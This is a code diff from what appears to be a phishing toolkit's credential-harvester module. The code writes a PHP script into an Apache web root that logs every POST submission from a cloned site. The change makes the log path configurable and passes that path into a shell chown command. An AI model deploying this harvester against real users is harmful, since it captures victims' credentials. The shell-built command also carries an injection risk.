@@ -429,14 +429,17 @@ def run():
         print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
         print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
-        filewrite = file("%s/post.php" % (apache_dir), "w")
         now=datetime.datetime.today()
-        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
+        log_file = check_config("HARVESTER_LOG=")
+        if not log_file:
+            log_file = '%s/harvester_%s.txt' % (apache_dir, now)
+        filewrite = file("%s/post.php" % (apache_dir), "w")
+        filewrite.write("""<?php $file = '%s';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % log_file)
         filewrite.close()
-        filewrite = file("%s/harvester_%s.txt" % (apache_dir,now), "w")
+        filewrite = file(log_file, "w")
         filewrite.write("")
         filewrite.close()
-        subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (apache_dir,now), shell=True).wait()
+        subprocess.Popen("chown www-data:www-data '%s'" % log_file, shell=True).wait()
         # here we specify if we are tracking users and such
         if track_email.lower() == "on":
             fileopen = file (setdir + "/web_clone/index.html", "r")
